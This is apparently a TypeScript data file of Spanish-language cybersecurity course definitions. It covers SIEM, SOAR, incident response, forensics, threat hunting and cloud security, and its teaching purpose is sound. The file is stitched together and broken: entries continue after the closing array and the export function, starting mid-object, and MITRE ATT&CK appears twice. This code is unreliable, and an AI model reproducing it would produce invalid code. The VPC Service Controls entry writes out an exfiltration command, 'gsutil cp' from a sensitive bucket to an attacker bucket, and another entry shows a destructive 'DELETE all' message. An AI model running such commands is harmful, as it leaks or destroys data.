      "\\n**En Microsoft Sentinel (KQL)**:\n" +
      "```kql\nSecurityEvent | where EventID == 4625 | summarize FailureCount=count() by AccountName, SourceIP | where FailureCount > 20\n```",
    examples: [
      "Regla: 4+ conexiones fallidas SSH (Event ID 4625) + 1 éxito (4624) en 10 min = credencial robada probable.",
      "Regla: proceso descendiente de WINWORD.exe ejecutando powershell.exe = inyección Office macro maliciosa.",
    ],
    related: ["SIEM", "Detección de amenazas", "Falsos positivos"],
  },
  {
    id: 452,
    module: 42,
    term: "Dashboards y visualización",
    short: "Interfaz visual en tiempo real de métricas de seguridad, alertas y KPIs para toma de decisiones.",
    detail:
      "Un **dashboard SIEM** muestra:\n" +
      "→ Alertas en cola (criticidad rojo/amarillo/verde)\n" +
      "→ Eventos por hora (spike detecta ataques DDoS)\n" +
      "→ Top 10 atacantes (IPs, users, hosts)\n" +
      "→ Eventos por tipo (login, file access, malware)\n" +
      "→ Compliance: % uptime, % eventos logeados, MTTR (mean time to respond)\n" +
      "\\n**Ejemplo de KPI**:\n" +
      "• **MTTD** (Mean Time to Detect) — promedio: 45 minutos\n" +
      "• **MTTR** (Mean Time to Respond) — promedio: 2 horas\n" +
      "• **Alert Accuracy** — % de alerts true positive vs false positive (target: >70%)\n" +
      "• **Coverage** — % de hosts/apps con logs forwarded (target: >95%)\n" +
      "\\n**Reducir ruido (alert fatigue)**:\n" +
      "→ Tuning: threshold de reglas (si >100 falsos positivos/día, subir threshold)\n" +
      "→ Whitelisting: IPs legales (backup scripts, scanners)\n" +
      "→ Suppression: alerts conocidas de mantenimiento programado\n" +
      "→ Correlación: no alertar en N eventos aislados, solo si N+M ocurren juntos\n" +
      "> ⚠️ Alert fatigue hace que L1 ignore reales alertas. Un bien tuned SIEM es diferencia entre SOC efectivo e inútil.",
    examples: [
      "Dashboard muestra 347 alerts hoy. 330 son backup job timeout (whitelist). 17 reales. L1 triage los 17.",
      "KPI: MTTD subió a 2 horas (fue 45 min). Síntoma: crecimiento de eventos no procesados (capacity issue → agregar parsers).",
    ],
    related: ["SIEM", "Métricas de seguridad", "Reportes de compliance"],
  },
  {
    id: 453,
    module: 42,
    term: "SOAR (Security Orchestration, Automation, Response)",
    short: "Plataforma que automatiza respuesta a incidentes: aisla hosts, bloquea IPs, abre tickets, sin intervención manual.",
    detail:
      "**SOAR** es el siguiente paso después del SIEM. Automatiza la **respuesta**:\n" +
      "\\n**Ejemplo: Alert de malware detectado**\n" +
      "1. SIEM dispara: \"hash malicioso encontrado en procesos\"\n" +
      "2. SOAR playbook automático:\n" +
      "   - Aisla host de la red (desconectar del VLAN productivo)\n" +
      "   - Mata el proceso (rundll32.exe malicioso)\n" +
      "   - Extrae memory dump para análisis\n" +
      "   - Crea ticket en Jira/ServiceNow → L2 investigación\n" +
      "   - Notifica al CISO por Slack\n" +
      "   - Busca otros hosts con mismo hash (threat hunt)\n" +
      "\\n**Ventajas**:\n" +
      "→ **Tiempo**: MTTR de 2 horas → 5 minutos (sin esperar L1 que vea el alert)\n" +
      "→ **Consistencia**: el playbook siempre hace lo mismo (sin olvidos)\n" +
      "→ **Escalabilidad**: procesa 10 alerts paralelos sin 10 L1s\n" +
      "→ **Cumplimiento**: auditoría automática de cada acción (quién ordenó qué)\n" +
      "\\n**Plataformas SOAR**:\n" +
      "• **Splunk Phantom** (ahora Splunk Enterprise Security)\n" +
      "• **Palo Alto Cortex XSOAR**\n" +
      "• **ServiceNow Security Operations**\n" +
      "• **Tines** (open-source, startup friendly)\n" +
      "\\n**Riesgo**: playbook automático aisla host legítimo por falso positivo → downtime. Validación vs velocidad.",
    examples: [
      "Alert: credential stuffing contra SSH. SOAR: bloquea IP atacante en firewall + abre ticket + notification CISO — todo en <1 min.",
      "False positive: backup job parece exfil (10 GB a IP remota). SOAR aisló host. Después se descubre: es backup legítimo. Downtime: 30 min. Acción: whitelist IP backup.",
    ],
    related: ["SIEM", "Playbooks de respuesta", "Automatización"],
  },

  // ── M43 · Incident Response ────────────────────────────────────────────
  {
    id: 460,
    module: 43,
    term: "Ciclo de Respuesta a Incidentes (IR)",
    short: "6 fases: Preparación → Identificación → Contención → Erradicación → Recuperación → Lecciones aprendidas.",
    detail:
      "**NIST SP 800-61** define el ciclo:\n" +
      "\\n**1. Preparación**\n" +
      "→ Políticas y procedimientos escritos\n" +
      "→ Equipo IR entrenado (técnico + legal + comunicaciones)\n" +
      "→ Herramientas pre-instaladas (Wireshark, Volatility, Autopsy)\n" +
      "→ Relaciones pre-establecidas (ISP, law enforcement, abogados)\n" +
      "→ Playbooks para ataques comunes (ransomware, breach, DDoS)\n" +
      "\\n**2. Identificación** (DETECTAR)\n" +
      "→ SIEM alerta / usuario reporta / análisis forense\n" +
      "→ Triage: ¿es verdadero incidente o falso positivo?\n" +
      "→ Iniciar caso en ticket system\n" +
      "→ Activar equipo IR\n" +
      "\\n**3. Contención** (FRENAR)\n" +
      "• **Corto plazo**: desconectar del cable / matar el proceso / bloquear IP\n" +
      "• **Largo plazo**: parcheado, cambio de credenciales, reglas firewall\n" +
      "\\n**4. Erradicación** (REMOVER)\n" +
      "→ Remover malware completamente\n" +
      "→ Cerrar la puerta de entrada (patch, credencial fuerte, MFA)\n" +
      "→ Validar no persiste (check artefactos persistencia)\n" +
      "\\n**5. Recuperación** (RECUPERAR)\n" +
      "→ Restaurar sistemas desde backups limpios\n" +
      "→ Validar estabilidad (monitoreo intenso por 2 semanas)\n" +
      "→ Gradualmente volver a producción\n" +
      "\\n**6. Post-Incidente** (APRENDER)\n" +
      "→ Tabletop exercise: simular el mismo ataque, mejorar respuesta\n" +
      "→ Actualizar playbooks\n" +
      "→ Capacitación: qué pasó, cómo lo detectamos, qué cambió\n" +
      "\\n> ⚠️ Tiempo es crítico: cada minuto = más datos exfiltrados / spread.",
    examples: [
      "Ransomware detectado (identification). 1 host aislado (containment). Ransomware removido (eradication). Datos restaurados de backup (recovery).",
      "Post-incident: se descubre entrada via RDP débil. GPO implementa MFA en todos los RDP. Capacitación passwords fuertes.",
    ],
    related: ["Preparación de IR", "Playbooks", "Comunicación de crisis"],
  },
  {
    id: 461,
    module: 43,
    term: "Contención de incidentes",
    short: "Acciones inmediatas para frenar la propagación del ataque y minimizar daño mientras se investiga.",
    detail:
      "**Contención = SPEED**. Decisiones en minutos, no horas.\n" +
      "\\n**Contención corto plazo** (primeros 15 minutos):\n" +
      "→ **Aislar el host** — desconectar del cable (no shutdown, podrías perder evidencia en RAM)\n" +
      "→ **Bloquear el atacante** — IPs conocidas en firewall / WAF\n" +
      "→ **Revocar credenciales** — resets password sospechosa si no está comprometida la root\n" +
      "→ **Detener procesos** — matar malware observable (pero ejecutar en foremost para volcado)\n" +
      "→ **Notificar al CISO** — escalación inmediata\n" +
      "\\n**Contención largo plazo** (horas a días):\n" +
      "→ **Parchear** — aplicar security patch de vulnerabilidad explotada\n" +
      "→ **Cambio de credenciales** — toda persona cuyo password podría estar comprometida\n" +
      "→ **Actualizar reglas** — firewall, WAF, EDR adicionales\n" +
      "→ **Segmentación** — si movimiento lateral, aislar subredes\n" +
      "→ **Monitoreo intensivo** — EDR, SIEM, netflow en máxima sensibilidad\n" +
      "\\n**Trade-off crítico: Preservación de evidencia vs Contención**\n" +
      "→ Apagar máquina contamina escena (volátil desaparece)\n" +
      "→ Dejar activo permite propagación\n" +
      "→ Decisión: depende de severidad (ransomware = aisla ASAP, espía silencioso = congelá primero para volcado)",
    examples: [
      "Ransomware hits: 500 máquinas infectadas en 2 min. Acción: bloquea dominio C2 en firewall central (frenar el spread). Luego: isolate 50 primeras máquinas.",
      "Espía detectado en servidor: antes de matar, VOLATILITY volcado de RAM (captura credenciales en memoria, conexiones C2). Luego aislamiento.",
    ],
    related: ["Ciclo de IR", "Erradicación", "Preservación de evidencia"],
  },
  {
    id: 462,
    module: 43,
    term: "Erradicación y validación",
    short: "Remover completamente el malware, cerrar la puerta de entrada y verificar no persiste.",
    detail:
      "**Erradicación** es eliminar la causa raíz, no solo los síntomas.\n" +
      "\\n**Pasos**:\n" +
      "1. **Identificar ALL instances** — búsqueda en toda la red, no solo el host origen\n" +
      "   - Scan de hashes malware en todos los endpoints\n" +
      "   - Búsqueda de IoCs: IPs C2, dominios, rutas de archivo, registry keys\n" +
      "   - YARA rules en PCAP histórico\n" +
      "\\n2. **Remover**:\n" +
      "   - Borrar archivos maliciosos (manual + antivirus scan)\n" +
      "   - Eliminar claves persistencia (registry Run keys, scheduled tasks, WMI, LSA)\n" +
      "   - Killswitch en firewall si es comando remoto\n" +
      "   - Si ransomware cifró datos: restaurar de backup (sin malware)\n" +
      "\\n3. **Cerrar puerta de entrada**:\n" +
      "   - Patch de vulnerabilidad (si exploit conocido)\n" +
      "   - MFA obligatorio (si credentials robadas)\n" +
      "   - Monitoreo permanente de credenciales en dark web\n" +
      "\\n4. **Validación post-erradicación**:\n" +
      "   - Rescan de todos los hosts (confirma 0 detecciones)\n" +
      "   - Verificar persistencia (registry, cron, startup folders)\n" +
      "   - Monitoreo 72 horas intenso (si re-aparece = no erradicó completamente)\n" +
      "   - Análisis de artefactos: ¿quedaron dropper, backdoor secundario?",
    examples: [
      "Emotet removido de host inicial pero aún en 40 máquinas. Búsqueda SIEM: _all_ hosts con archivo EXE de hash. Limpieza masiva + patch.",
      "Ransomware erradicado de archivo, datos restaurados. 2 días después re-aparece en máquina diferente. Indicador: backdoor secondary no removida. Segunda ronda erradicación.",
    ],
    related: ["Contención", "Recuperación", "Threat hunting"],
  },
  {
    id: 463,
    module: 43,
    term: "Post-Incidente y Lessons Learned",
    short: "Análisis retrospectivo: qué salió mal, qué salió bien, cómo mejoramos defensas y procesos.",
    detail:
      "**Post-incident review** (PIR) es el aprendizaje institucional del incidente.\n" +
      "\\n**Timeline**:\n" +
      "→ **Dentro de 48 horas**: briefing rápido (CISO, IT, Legal, Comms)\n" +
      "→ **Dentro de 1 semana**: full meeting (técnicos detallan)\n" +
      "→ **Dentro de 1 mes**: informe final + acciones correctivas\n" +
      "\\n**Preguntas a responder**:\n" +
      "1. **¿Qué pasó?** — Timeline de eventos, de quién a quién, atacante/víctima/datos\n" +
      "2. **¿Por qué no lo detectamos antes?** — Análisis de gaps (SIEM no loguea evento, EDR no instalado)\n" +
      "3. **¿Por qué sucedió?** — Causa raíz\n" +
      "   - Vulnerabilidad sin parchear\n" +
      "   - Credencial débil reutilizada\n" +
      "   - Insider malicioso\n" +
      "   - Falta de segmentación\n" +
      "4. **¿Qué haríamos diferente?** — Acciones mejora:\n" +
      "   - Patch en 2 días vs 30 días\n" +
      "   - MFA obligatorio vs opcional\n" +
      "   - SIEM con EDR (visibilidad endpoint)\n" +
      "   - Tabletop ejercicios trimestrales\n" +
      "\\n**Tabletop Exercise**:\n" +
      "→ Simula el mismo ataque (\"si volviera a pasar hoy...\")\n" +
      "→ Identifica qué cambios funcionarían\n" +
      "→ Entrena al equipo (sin presión real)\n" +
      "→ Mejora de documentación de playbooks\n" +
      "\\n**Comunicación de hallazgos**:\n" +
      "→ Técnico: a IT/Sec team (detalles)\n" +
      "→ Ejecutivo: a Junta directiva (riesgo, $ impacto, acciones correctivas, timeline)\n" +
      "→ Público: statement (si breach de PII) → notificación regulatoria",
    examples: [
      "PIR: ransomware por RDP expuesto. Raíz: firewall permitía 3389 de anywhere. Acción: 1) MFA, 2) IP whitelist, 3) educ. Validación: tabletop en 3 meses.",
      "Insider vio datos sensibles. PIR identifica: SIEM no loguea acceso a DB, DLP ausente. Acción: instalar Imperva DLP + capacitación de datos. Cost $200K pero PII breach evitada.",
    ],
    related: ["Ciclo de IR", "Tabletop exercises", "Compliance y notificación"],
  },
];

export function definitionsByModule(moduleId: number): ConceptDefinition[] {
  return DEFINITIONS.filter((d) => d.module === moduleId);
}
    short: "Proceso estructurado para contener, erradicar y recuperarse de un evento de seguridad.",
    detail:
      "Un **incidente** es un evento que **compromete la confidencialidad, integridad o disponibilidad** de la información. Fases del **IR**:\n" +
      "\\n1. **Preparación** — políticas, herramientas, equipo entrenado, respuesta pre-plan.\n" +
      "2. **Identificación** — detección de anormalías (alertas SIEM, reportes de usuarios, pruebas).\n" +
      "3. **Contención**:\n" +
      "   - Corto plazo: aislar el sistema comprometido de la red (kill the connection).\n" +
      "   - Largo plazo: parcheado, cambio de credenciales, reglas firewall.\n" +
      "4. **Erradicación** — remover el malware, cerrar la puerta de entrada (patch vulnerabilidad).\n" +
      "5. **Recuperación** — restaurar sistemas a estado limpio, validar estabilidad.\n" +
      "6. **Análisis post-incidente** — **lecciones aprendidas**, mejorar controles.\n" +
      "> ⚠️ El tiempo es vida en IR: cada minuto de downtime o exfiltración cuenta.",
    examples: [
      "Phishing → delivery de payload → detección en 3 horas → aislamiento 5 horas → recuperación 24 horas.",
      "Breach no detectado en meses: inicio 2023-01-15, descobrimiento 2023-06-30 = 166 días de exposición.",
    ],
    related: ["Investigación forense", "Indicadores de compromiso", "Plan de continuidad"],
  },
  {
    id: 415,
    module: 38,
    term: "Investigación forense",
    short: "Análisis detallado de un incidente para determinar qué, cómo, cuándo y quién.",
    detail:
      "**Forensics** = recopilación y análisis de **evidencia digital** de forma científica, preservando **cadena de custodia**:\n" +
      "\\n**Cadena de custodia**: registro de quién tocó la evidencia, cuándo y por qué. Romper la cadena invalida la prueba legalmente.\n" +
      "\\n**Artefactos forenses** (Windows):\n" +
      "• **Event Logs** (3 de ellos: Security, System, Application) → quién loggeó, errores, cambios.\n" +
      "• **MFT (Master File Table)** → info de ficheros (tiempos, tamaños, clusters).\n" +
      "• **Prefetch / RecentApps** → qué programas se ejecutaron.\n" +
      "• **Registro Windows** → configuración, instalaciones, conexiones red, MRU (most recently used).\n" +
      "• **Memory dump** → procesos activos, credenciales en RAM, conexiones activas.\n" +
      "\\n**Herramientas**: EnCase, FTK, Volatility (memory), Wireshark (network pcaps).",
    examples: [
      "Event Log: UserA loggeó a las 02:30 (hora rara), ejecutó cmd.exe, cambió contraseña administrador.",
      "Memory dump: proceso svchost.exe contiene URL a C2, credenciales en plain-text.",
    ],
    related: ["Respuesta a incidentes", "Análisis de malware", "Evidencia digital"],
  },
  {
    id: 416,
    module: 38,
    term: "Cadena de custodia",
    short: "Documentación rigurosa de quién, cuándo, dónde y por qué se manipuló evidencia digital.",
    detail:
      "La **cadena de custodia** es crítica para **viabilidad legal** de la evidencia. Requisitos:\n" +
      "• **Integridad** — la evidencia no fue modificada (hash criptográfico pre/post).\n" +
      "• **Autenticidad** — es real (firmado criptográficamente, testigos).\n" +
      "• **Trazabilidad** — cada persona que tocó la evidencia está registrada.\n" +
      "\\n**En práctica**:\n" +
      "1. Clonar disco con herramienta forense (crea imagen, verifica hash MD5/SHA256).\n" +
      "2. Documentar: quién clonó, cuándo, dónde, por qué, tool versión, hash.\n" +
      "3. Sellar físicamente (tamper tape) y digitalmente (firma criptográfica).\n" +
      "4. Cada acceso posterior: registrar en acta de custodia.\n" +
      "5. En juicio, demostrar que nadie más tocó la evidencia.",
    examples: [
      "Disk clonado con WriteBlocker + Encase: hash original SHA256 = ABC123... verificado en audit.\n" +
      "Si alguien toca el disco sin registro, la defensa puede argumentar contaminación y se desestima la evidencia.",
    ],
    related: ["Investigación forense", "Estándares forenses", "Admisibilidad en juicio"],
  },
  {
    id: 417,
    module: 38,
    term: "MITRE ATT&CK Framework",
    short: "Catálogo de técnicas y tácticas reales de atacantes, organizado por objetivo (recon, execution, etc).",
    detail:
      "**MITRE ATT&CK** es el **equivalente ofensivo del NIST Cybersecurity Framework**. Organiza ataques por **tácticas** (qué quiere) y **técnicas** (cómo lo logra):\n" +
      "\\n**11 Tácticas principales**:\n" +
      "1. **Reconnaissance** — recopila info previa (OSINT, scanning).\n" +
      "2. **Resource Development** — compra dominios, infraestructura.\n" +
      "3. **Initial Access** — entra (phishing, vuln exploit, supply chain).\n" +
      "4. **Execution** — ejecuta código (script, command, malware).\n" +
      "5. **Persistence** — queda residente (backdoor, cron job, startup).\n" +
      "6. **Privilege Escalation** — obtiene admin.\n" +
      "7. **Defense Evasion** — evade detección (ofuscación, living-off-the-land).\n" +
      "8. **Credential Access** — roba credenciales.\n" +
      "9. **Discovery** — mapea la red interna.\n" +
      "10. **Lateral Movement** — salta a otros sistemas.\n" +
      "11. **Exfiltration** — extrae datos.\n" +
      "> 💡 Mapear un incidente contra ATT&CK: \"el atacante usó T1566.002 (phishing con attachment)\", facilita comunicación y defensa.",
    examples: [
      "APT28 (Fancy Bear) típicamente usa T1071.001 (Application Layer Protocol) para C2.",
      "Ransomware Ryuk: recon (T1592) → lateral movement (T1570) → exfil (T1537) → encrypt (T1486).",
    ],
    related: ["Respuesta a incidentes", "Threat intelligence", "Threat hunting"],
  },
  {
    id: 418,
    module: 38,
    term: "Threat Hunting",
    short: "Búsqueda proactiva de indicios de compromiso antes de que afecten la operación.",
    detail:
      "**Threat hunting** = **detective criminalístico en tu red**. No esperas a que alertas salten; buscas activamente:\n" +
      "\\n**Proceso**:\n" +
      "1. **Hipótesis** — \"un atacante podría estar aquí porque...\" (basada en inteligencia, vulnerabilidades, industria).\n" +
      "2. **Investigación** — query logs (SIEM), network pcaps (Zeek), endpoint telemetry (EDR).\n" +
      "3. **Validación** — ¿es real o falso positivo? (correlaciona con múltiples fuentes).\n" +
      "4. **Contención** — si es real, aislamiento inmediato.\n" +
      "5. **Análisis** — ¿qué más compromete? ¿cuánto tiempo estuvo?\n" +
      "\\n**Indicios a buscar**:\n" +
      "• Outbound DNS a dominios new/rare (DGA botnets).\n" +
      "• PowerShell suspicious (obfuscated, downloading, encoding).\n" +
      "• Conexiones a puertos no-standard (C2 alternativo).\n" +
      "• Cambios en SAM/NTDS (crack de credenciales offline).\n" +
      "• Share enumerations / lateral pass-the-hash.",
    examples: [
      "Query SIEM: todos los DNS a dominios .ru de hosts que no deberían resolver externos.",
      "EDR alert: proceso hijo de svchost.exe corriendo powershell (anomalía, típico malware).",
    ],
    related: ["Respuesta a incidentes", "SIEM", "Indicadores de compromiso"],
  },
  {
    id: 419,
    module: 38,
    term: "Plan de continuidad y recuperación",
    short: "Estrategia de backup, failover y recuperación para minimizar downtime e impacto de desastres.",
    detail:
      "**Continuidad** = negocio sigue funcionando. **Recuperación** = vuelve a normal. Métricas:\n" +
      "• **RTO (Recovery Time Objective)** — tiempo máximo tolerable de downtime. ej: 4 horas.\n" +
      "• **RPO (Recovery Point Objective)** — cantidad máxima de datos que podemos perder. ej: 1 hora de datos.\n" +
      "\\n**Estrategias**:\n" +
      "| | Backup | Failover | Geo-redundancia |\n" +
      "|---|---|---|---|\n" +
      "| **Costo** | Bajo | Medio-alto | Alto |\n" +
      "| **RTO** | Horas-días | Minutos | Segundos |\n" +
      "| **RPO** | Horas | Minutos | Segundos |\n" +
      "\\n**Pruebas**: **DR drill anual** (apaga todo y ve si recuperas). No es teoría — es práctica.",
    examples: [
      "BCP: si datacenter USA se cae, failover a réplica en EU (RPO=0, RTO=30s).",
      "Ransomware: restaurar desde backup de 24h atrás (RPO=24h, RTO=2-4h según tamaño).",
    ],
    related: ["Backup y archivado", "Resiliencia", "Gestión de riesgos"],
  },

  // ── M44 · Threat Hunting ──────────────────────────────────
  {
    id: 470,
    module: 44,
    term: "Hypothesis-driven hunting",
    short: "Búsqueda de amenazas basada en suposiciones fundamentadas sobre tácticas atacantes.",
    detail: "Diferencia vs detección: la detección responde a alertas, hunting **asume el atacante YA está**.\n\n**Hypothesis loop**:\n1. **Desarrollar hipótesis** — de threat intel, vulnerabilidades conocidas, MITRE ATT&CK\n2. **Coleccionar datos** — SIEM, EDR, PCAP, logs\n3. **Investigar** — escribir queries, correlacionar\n4. **Validar** — ¿evidencia de TTPs o falso positivo?\n5. **Documentar** — IoCs, técnicas, scope\n\nHunting es **proactivo**, no reactivo.",
    examples: ["Query: procesos hijo de Office ejecutando PowerShell (T1566 Phishing)", "Buscar conexiones a TOR saliendo del corp"],
    related: ["SIEM", "Análisis de tráfico", "MITRE ATT&CK"],
  },
  {
    id: 471,
    module: 44,
    term: "MITRE ATT&CK Framework",
    short: "Matriz de tácticas y técnicas atacantes reales, documentadas por adversarios.",
    detail: "**ATT&CK** = Adversarial Tactics, Techniques & Common Knowledge.\n\n**14 tácticas** (fases del ataque):\n- Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact\n\n**Técnicas** bajo cada táctica (ej: T1566 = Phishing, sub-técnicas: Phishing-Spearphishing).\n\n**Uso en hunting**: mapping de observables (proceso sospechoso, dominio, file hash) a técnica → **cubrís la brecha detectiva**.",
    examples: ["T1053: Scheduled Task (Windows)", "T1059: Command and Scripting Interpreter (PowerShell)"],
    related: ["Threat intelligence", "Detección y respuesta"],
  },
  {
    id: 472,
    module: 44,
    term: "Pyramid of Pain",
    short: "Jerarquía de indicadores por dificultad del atacante para cambiarlos.",
    detail: "Base (fácil para atacante cambiar) → Tope (difícil):\n\n1. **Hash** — Cambiar 1 bit del malware → hash nuevo\n2. **IP** — Cambiar servidor C2\n3. **Dominio** — Cambiar registrador, obtener nuevo dominio (horas)\n4. **Artefactos host/red** — Cambiar TTPs locales (difícil)\n5. **Herramientas** — Cambiar framework (Metasploit → CobaltStrike)\n6. **TTPs** (Tácticas/Técnicas/Procedimientos) — Cambiar forma de operar (MÁS difícil)\n\n**Estrategia**: cazar por TTPs, no hashes. Más robusto a cambios del atacante.",
    examples: ["IoC débil: hash único", "IoC fuerte: PowerShell con obfuscation + conexión a puerto 8080 + beacon cada 5min"],
    related: ["Indicadores de compromiso", "Análisis de amenazas"],
  },
  {
    id: 473,
    module: 44,
    term: "Detección de anomalías (baselining)",
    short: "Establecer comportamiento normal para identificar desviaciones sospechosas.",
    detail: "**Baseline** = comportamiento esperado. **Anomalía** = desvío significativo.\n\n**Métodos**:\n- **Estadístico** — Media ± N desviaciones estándar (tiempo de login, bytes transferidos)\n- **ML** — Entrenar modelo con comportamiento normal, alertar sobre outliers\n- **Heurístico** — Reglas (proceso desde ruta inusual, usuario logueado en 10 máquinas en 1h)\n\n**Reto**: diferenciar anomalía benigna (empleado trabajando de noche) de maliciosa (credential spraying).",
    examples: ["Usuario normalmente descarga 100MB/día, hoy descargó 5GB → alert", "Proceso svchost.exe raramente inicia procesos, hoy spawned cmd.exe → alert"],
    related: ["Perfilamiento de usuario", "Detección de anomalías"],
  },

  // ── M45 · Cloud Security: AWS (continuación) ──────────────────────────────────
  {
    id: 480,
    module: 45,
    term: "Lambda y serverless security",
    short: "Seguridad en funciones ejecutadas sin gestionar servidores.",
    detail: "**Lambda** = ejecuta código sin provisionar infraestructura. Riesgos:\n\n- **IAM overpermissive** — Lambda tiene rol con acceso a todo S3 (least privilege: 1 bucket específico)\n- **Secrets en código** — database password en env var (usar Secrets Manager)\n- **Dependencies vulnerables** — npm modules con CVEs\n- **Execution time limit** — timeout = 15 min max (DoS: loop infinito)\n- **Cold start timing** — primeros invoke lentos (variable, difícil predecir)\n- **Third-party integrations** — 3rd party layer agrega código externo (audit)\n\n**Defensa**: IAM fine-grained, Secrets Manager, SAST scanning, VPC for DBs",
    examples: ["Lambda con role que dice `\"Action\": \"s3:*\"` → reduce a específico bucket", "Malware en npm package instalado → SBOM scanning obligatorio"],
    related: ["IAM", "Secrets management", "Serverless"],
  },
  {
    id: 481,
    module: 45,
    term: "Event-driven architecture risks",
    short: "Riesgos de seguridad cuando múltiples servicios se comunican por eventos.",
    detail: "**Event-driven** (SNS, EventBridge, Kinesis) desacopla servicios. Riesgos:\n\n- **Lateral movement** — Malware en 1 servicio emite evento → dispara 10 servicios (compromete cadena)\n- **Event injection** — Enviar evento falso para ejecutar acción no autorizada\n- **Message loss** — Eventos perdidos = datos/auditoría incompleta\n- **Race conditions** — Evento A y B compiten por recurso (inconsistencia)\n\n**Mitigación**: validar eventos, IAM granular en consumers, auditoría completa, encryption en tránsito",
    examples: ["SNS message: 'DELETE all s3://bucket/*' sin validación → disaster", "Kinesis stream desencripted → credenciales en claro en eventos"],
    related: ["Event architecture", "Desacoplamiento", "Validación"],
  },
  {
    id: 482,
    module: 45,
    term: "Logging y auditoría en AWS",
    short: "Registrar todas las acciones (CloudTrail, VPC Flow Logs, ALB logs) para investigación post-incidente.",
    detail: "**CloudTrail** — API call audit log (quién, qué, cuándo).\n**VPC Flow Logs** — Network traffic metadata (5-tuple: srcIP:port → dstIP:port).\n**ALB/NLB Logs** — HTTP request details.\n**Config** — Configuration changes history.\n\n**Retos**:\n- **Desabilitados** — Atacante deshabilita CloudTrail (pero pasa 15 min antes)\n- **Retención** — Default 90 días (insuficiente para compliance; mover a S3 lifecycle)\n- **Analysis** — 1TB/día de logs sin herramienta = useless (Athena queries, Splunk integration)\n\n**Defensa**: no permitir disable (SCP), S3 MFA delete para audit logs, Athena/QuickSight queries",
    examples: ["CloudTrail: `DisableLogging` event → attacker tried to cover tracks", "VPC Flow: REJECTED flow 192.168.x.x → 10.0.1.100:3306 = network segmentation working"],
    related: ["Auditoría", "Compliance", "Forense"],
  },
  {
    id: 483,
    module: 45,
    term: "Cost anomaly detection",
    short: "Monitorear cambios anómalos en facturas AWS para detectar compromiso o abuso de recursos.",
    detail: "**Caso real**: Atacante obtiene credenciales → spinnea 1000 EC2 instances para crypto mining → bill 50K USD.\n\n**AWS Cost Anomaly Detection**:\n- Baselining automático de gastos históricos\n- Alertas en Slack/email si gasto sube 20%\n- Configurar por servicio, linked account, tag\n\n**Investigación**:\n- Athena query sobre CloudTrail: ¿quién creó esas instancias?\n- EC2 console: ¿instancias legítimas o rogue?\n- Factura: ¿servicios que no reconozco?\n\n**Mitigación rápida**: SCPs para limitar max vCPU por account, auto-terminate instances sin tag corporativo",
    examples: ["Bill subió de $5K a $15K en 1 día → query: 1000 t3.2xlarge instances creadas anoche", "S3 se triplica → alguien backup-ea tabla entera sin compresión"],
    related: ["Gobernanza", "Detección de fraude", "Cost optimization"],
  },

  // ── M46 · Cloud Security: Azure + GCP ──────────────────────────────────
  {
    id: 490,
    module: 46,
    term: "Azure Entra ID (Azure AD) y roles administrativos",
    short: "Gestión de identidad centralizada en Microsoft Entra; riesgos de roles con permisos altos.",
    detail: "**Entra ID** (ex Azure AD) es el IAM de Azure.\n\n**Roles críticos**:\n- **Global Administrator** — Acceso total a tenant (evitar)\n- **Privileged Role Administrator** — Gestiona acceso a otros roles (escalada)\n- **User Administrator** — Crea/elimina usuarios, reset passwords (phishing)\n\n**Ataques comunes**:\n- **Token theft** — Robar token refresh → acceso persistente\n- **Consent phishing** — App maliciosa pide permisos (\"Want to access your Outlook?\") → usuario acepta\n- **Password reset abuse** — Entra ID admin resets password de CEO → attacker logueado\n\n**Defensa**: PIM (Privileged Identity Management), Conditional Access, MFA mandatory, guest invite restrictions",
    examples: ["Attacker: compromise user → request 'contribute to GitHub repo' scope → API access to org repos", "Entra ID log: user reset password from Greenland at 3 AM (anomaly)"],
    related: ["Identidad federada", "Conditional Access", "Risk-based policies"],
  },
  {
    id: 491,
    module: 46,
    term: "GCP IAM bindings y roles predefinidos",
    short: "Modelo de permisos en Google Cloud basado en roles, con muchas configuraciones incorrectas comunes.",
    detail: "**GCP IAM** organiza identidades → roles → permissions.\n\n**Niveles de scope**:\n- Organization (todos los projects)\n- Folder (múltiples projects)\n- Project (recursos en proyecto)\n- Resource (storage bucket específico)\n\n**Anti-patrones**:\n- **Editor role** en Project → acceso a TODO (roles predefinidos demasiado amplios)\n- **allUsers** en bucket → público el mundo (datos sensibles expuestos)\n- **Service account keys** exportadas → cronjob baja key, corre en máquina local (credenciales en USB)\n\n**Defensa**: custom roles (solo permisos necesarios), Workload Identity (bind K8s serviceaccount a GCP SA sin keys), audit CloudAudit Logs",
    examples: ["Bucket con `allUsers` tiene access → 1M docs descargados overnight (exfil)", "Service account key encontrada en GitHub → attacker accede toda la org"],
    related: ["Least privilege", "Workload identity", "Auditoría"],
  },
  {
    id: 492,
    module: 46,
    term: "Compliance en cloud (FedRAMP, HIPAA, GDPR)",
    short: "Cumplimiento normativo en plataformas cloud; cada plataforma tiene certificaciones distintas.",
    detail: "**FedRAMP** (US Government) — AWS/Azure/GCP tienen clouds autorizadas.\n**HIPAA** (Salud EE.UU.) — Patient data protections.\n**GDPR** (EU) — Data residency, right to erasure, etc.\n\n**Riesgos**:\n- Cloud no ofrece certificación requerida → no puedes usarlo legalmente\n- Data residency — Datos de EU en datacenter Singapore → GDPR violation\n- Right to erasure — Usuario dice \"delete my data\" pero backup en Glacier (3-year retention) → no cumplido\n\n**Check**: Cloud Compliance Manager (Microsoft), Compliance Dashboard (AWS), en GCP → documentación\n\n**AWS example**: S3 bucket con PII en region `eu-west-1` pero replicado a `us-east-1` → GDPR issue",
    examples: ["Usar AWS GovCloud si trabajas para agencia federal", "Azure tiene HIPAA certification, GCP no (a 2024)"],
    related: ["Data governance", "Data residency", "Privacy"],
  },
  {
    id: 493,
    module: 46,
    term: "VPC Service Controls y network perimeters",
    short: "Crear perímetros de red en cloud para bloquear exfiltración de datos en GCP.",
    detail: "**VPC Service Controls** — firewall a nivel de Google APIs (antes de llegar a resource).\n\n**Escenario**: Una persona con credenciales válidas intenta `gsutil cp gs://sensitive-data gs://attacker-bucket`. Sin controls → copia exitosa.\n\n**Con Service Controls**:\n- Define perímetro: qué GCP projects están \"adentro\"\n- Política: solo acceso desde corporate IPs, dentro de horario laboral, no data xfil a external buckets\n- Resultado: gsutil copy bloqueado automáticamente\n\n**Ventaja**: incluso si credenciales son válidas, perímetro detiene exfil.\n\n**Azure equivalente**: Conditional Access policies + network isolation",
